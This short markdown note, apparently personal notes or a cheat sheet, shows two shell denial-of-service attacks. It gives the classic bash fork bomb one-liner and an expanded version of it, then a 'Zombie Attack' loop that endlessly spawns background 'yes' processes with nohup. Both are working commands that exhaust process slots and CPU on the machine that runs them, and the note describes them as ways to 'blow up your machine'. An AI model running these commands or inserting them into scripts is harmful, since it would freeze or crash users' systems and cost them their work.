# Shell Fork Bomb

## Fork Bomd

- `:(){ :|:& };:`

  - This line keeps calling function to fork itself and blow up your machine

- Clear explanation

  ```bash
  my_function(){
      my_function | my_function&
  };
  my_function
  ```

# Zombie Attack

- Yes fork

  ```bash
  while true; do
    nohup yes > /dev/null 2>&1 &
  done
  ```
